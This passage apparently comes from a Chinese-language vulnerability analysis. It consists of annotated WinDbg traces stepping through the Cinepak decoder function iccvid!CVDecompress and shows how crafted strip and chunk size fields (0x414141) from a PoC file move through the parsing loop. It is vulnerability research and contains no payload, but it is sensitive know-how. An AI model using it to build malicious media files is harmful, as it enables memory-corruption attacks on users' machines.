class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=00ba691e</span><br><span class="line"><span class="built_in">eip</span>=73b722fd <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x14f</span>:</span><br><span class="line">73b722fd c1e208          <span class="keyword">shl</span>     <span class="built_in">edx</span>,<span class="number">8</span>                                          <span class="comment">; edx = 0x00414100,左移8位</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000041</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba691e <span class="built_in">edx</span>=<span class="number">00414100</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=00ba691e</span><br><span class="line"><span class="built_in">eip</span>=73b72300 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x152</span>:</span><br><span class="line">73b72300 0bd0            <span class="keyword">or</span>      <span class="built_in">edx</span>,<span class="built_in">eax</span>                                        <span class="comment">; 以大端读取Size of chunk data</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000041</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba691e <span class="built_in">edx</span>=<span class="number">00414141</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=00ba691e</span><br><span class="line"><span class="built_in">eip</span>=73b72302 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x154</span>:</span><br><span class="line">73b72302 <span class="number">395508</span>          <span class="keyword">cmp</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">8</span>],<span class="built_in">edx</span> <span class="built_in">ss</span>:<span class="number">0023</span>:025afd38=<span class="number">00000004</span> <span class="comment">; 判断Size of strip data减去Strip Header大小后的数据大小是否小于Size of chunk data</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000041</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba691e <span class="built_in">edx</span>=<span class="number">00414141</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=00ba691e</span><br><span class="line"><span class="built_in">eip</span>=73b72305 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei ng nz na pe cy</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000287</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x157</span>:</span><br><span class="line">73b72305 8955e0          <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">20h</span>],<span class="built_in">edx</span> <span class="built_in">ss</span>:<span class="number">0023</span>:025afd10=<span class="number">00000000</span> <span class="comment">; [ebp-20h] = edx = 0x00414141,Size of chunk data</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000041</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba691e <span class="built_in">edx</span>=<span class="number">00414141</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=00ba691e</span><br><span class="line"><span class="built_in">eip</span>=73b72308 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei ng nz na pe cy</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000287</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x15a</span>:</span><br><span class="line">73b72308 0f82ab000000    <span class="keyword">jb</span>      iccvid!CVDecompress+<span class="number">0x20b</span> (73b723b9)    [br=<span class="number">1</span>] <span class="comment">; 小于则跳转，这里跳转</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000041</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba691e <span class="built_in">edx</span>=<span class="number">00414141</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=00ba691e</span><br><span class="line"><span class="built_in">eip</span>=73b723b9 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei ng nz na pe cy</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000287</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x20b</span>:</span><br><span class="line">73b723b9 0fbf450c        <span class="keyword">movsx</span>   <span class="built_in">eax</span>,<span class="built_in">word</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">0Ch</span>]   <span class="built_in">ss</span>:<span class="number">0023</span>:025afd3c=<span class="number">0000</span> <span class="comment">; eax = a2 = 0x0000 = (Strips bottom Y position)-(Strips top Y position)</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba691e <span class="built_in">edx</span>=<span class="number">00414141</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=00ba691e</span><br><span class="line"><span class="built_in">eip</span>=73b723bd <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei ng nz na pe cy</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000287</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x20f</span>:</span><br><span class="line">73b723bd 0faf4520        <span class="keyword">imul</span>    <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">20h</span>] <span class="built_in">ss</span>:<span class="number">0023</span>:025afd50=<span class="number">00000540</span> <span class="comment">; eax = 0x00000000,a7 = 0x540</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba691e <span class="built_in">edx</span>=<span class="number">00414141</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=00ba691e</span><br><span class="line"><span class="built_in">eip</span>=73b723c1 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x213</span>:</span><br><span class="line">73b723c1 01451c          <span class="keyword">add</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">1Ch</span>],<span class="built_in">eax</span> <span class="built_in">ss</span>:<span class="number">0023</span>:025afd4c=0232f850 <span class="comment">; [(Strips bottom Y position)-(Strips top Y position)]*a7+a6,a6 = 0x0232f850</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba691e <span class="built_in">edx</span>=<span class="number">00414141</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=00ba691e</span><br><span class="line"><span class="built_in">eip</span>=73b723c4 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x216</span>:</span><br><span class="line">73b723c4 ff45ec          <span class="keyword">inc</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">14h</span>]  <span class="built_in">ss</span>:<span class="number">0023</span>:025afd1c=<span class="number">00000001</span> <span class="comment">; [ebp-14h]++,coded strip计数器,[ebp-14h] = 0x2</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba691e <span class="built_in">edx</span>=<span class="number">00414141</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=00ba691e</span><br><span class="line"><span class="built_in">eip</span>=73b723c7 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x219</span>:</span><br><span class="line">73b723c7 8145fc00200000  <span class="keyword">add</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">4</span>],<span class="number">2000h</span> <span class="built_in">ss</span>:<span class="number">0023</span>:025afd2c=<span class="number">00002000</span> <span class="comment">; [ebp-4] = [ebp-4]+0x2000 = 0x4000,堆缓冲区指针偏移</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba691e <span class="built_in">edx</span>=<span class="number">00414141</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=00ba691e</span><br><span class="line"><span class="built_in">eip</span>=73b723ce <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x220</span>:</span><br><span class="line">73b723ce 33ff            <span class="keyword">xor</span>     <span class="built_in">edi</span>,<span class="built_in">edi</span>                                        <span class="comment">; edi = edi^edi = 0x00000000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba691e <span class="built_in">edx</span>=<span class="number">00414141</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b723d0 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x222</span>:</span><br><span class="line">73b723d0 8b45f8          <span class="keyword">mov</span>     <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">8</span>] <span class="built_in">ss</span>:<span class="number">0023</span>:025afd28=<span class="number">00000010</span> <span class="comment">; eax = [ebp-8] = 0x10,Size of strip data</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000010</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba691e <span class="built_in">edx</span>=<span class="number">00414141</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b723d3 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x225</span>:</span><br><span class="line">73b723d3 0145f4          <span class="keyword">add</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">0Ch</span>],<span class="built_in">eax</span> <span class="built_in">ss</span>:<span class="number">0023</span>:025afd24=00ba6912 <span class="comment">; [ebp-0Ch] = 0x00ba6912+0x10 = 0x00ba6922,指向第3个Strip Header，eax为Size of strip data</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000010</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba691e <span class="built_in">edx</span>=<span class="number">00414141</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b723d6 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x228</span>:</span><br><span class="line">73b723d6 2945f0          <span class="keyword">sub</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">10h</span>],<span class="built_in">eax</span> <span class="built_in">ss</span>:<span class="number">0023</span>:025afd20=0000004e <span class="comment">; [ebp-10h] = 3e,[ebp-10h]为未解压缩的数据长度，开始时等于PoC中cinepak_codec_data2和idx_tag字节数之和,这里算出剩余未解压缩的数据长度</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000010</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba691e <span class="built_in">edx</span>=<span class="number">00414141</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b723d9 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x22b</span>:</span><br><span class="line">73b723d9 03f0            <span class="keyword">add</span>     <span class="built_in">esi</span>,<span class="built_in">eax</span>                                        <span class="comment">; esi指向第2个Strip Header，eax为Size of strip data，这里移动数据指针,指向第3个Strip Header</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000010</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba691e <span class="built_in">edx</span>=<span class="number">00414141</span> <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b723db <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x22d</span>:</span><br><span class="line">73b723db 8b45e4          <span class="keyword">mov</span>     <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">1Ch</span>] <span class="built_in">ss</span>:<span class="number">0023</span>:025afd14=<span class="number">00000010</span> <span class="comment">; eax = [ebp-1Ch] = 0x10,Number of coded strips</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000010</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba691e <span class="built_in">edx</span>=<span class="number">00414141</span> <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b723de <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x230</span>:</span><br><span class="line">73b723de 3945ec          <span class="keyword">cmp</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">14h</span>],<span class="built_in">eax</span> <span class="built_in">ss</span>:<span class="number">0023</span>:025afd1c=<span class="number">00000002</span> <span class="comment">; [ebp-14h]为coded strips计数器,eax为Number of coded strips</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000010</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba691e <span class="built_in">edx</span>=<span class="number">00414141</span> <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b723e1 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei ng nz na po cy</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000283</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x233</span>:</span><br><span class="line">73b723e1 8975e8          <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">18h</span>],<span class="built_in">esi</span> <span class="built_in">ss</span>:<span class="number">0023</span>:025afd18=00ba691e <span class="comment">; [ebp-18h] = esi = 0x00ba6922,指向第3个Strip Header</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000010</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba691e <span class="built_in">edx</span>=<span class="number">00414141</span> <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b723e4 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei ng nz na po cy</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000283</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x236</span>:</span><br><span class="line">73b723e4 0f8c59feffff    <span class="keyword">jl</span>      iccvid!CVDecompress+<span class="number">0x95</span> (73b72243)     [br=<span class="number">1</span>] <span class="comment">; 小于则跳转，这里跳转</span></span><br><span class="line"></span><br><span class="line">----------------------------------------------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000010</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba691e <span class="built_in">edx</span>=<span class="number">00414141</span> <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72243 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei ng nz na po cy</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000283</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x95</span>:</span><br><span class="line">73b72243 8b45f0          <span class="keyword">mov</span>     <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">10h</span>] <span class="built_in">ss</span>:<span class="number">0023</span>:025afd20=0000003e <span class="comment">; [ebp-10h]为剩余未解压缩的数据长度</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0000003e <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba691e <span class="built_in">edx</span>=<span class="number">00414141</span> <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72246 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei ng nz na po cy</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000283</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x98</span>:</span><br><span class="line">73b72246 83f816          <span class="keyword">cmp</span>     <span class="built_in">eax</span>,<span class="number">16h</span>                                        <span class="comment">; 判断未解压的数据长度是否小于0x16</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0000003e <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba691e <span class="built_in">edx</span>=<span class="number">00414141</span> <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72249 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x9b</span>:</span><br><span class="line">73b72249 0f829b010000    <span class="keyword">jb</span>      iccvid!CVDecompress+<span class="number">0x23c</span> (73b723ea)    [br=<span class="number">0</span>] <span class="comment">; 小于则跳转，这里不跳转</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0000003e <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba691e <span class="built_in">edx</span>=<span class="number">00414141</span> <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7224f <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xa1</span>:</span><br><span class="line">73b7224f 0fb65603        <span class="keyword">movzx</span>   <span class="built_in">edx</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">3</span>]       <span class="built_in">ds</span>:<span class="number">0023</span>:00ba6925=<span class="number">10</span> <span class="comment">; edx = 0x10,第3个Size of strip data的低位字节</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0000003e <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba691e <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span 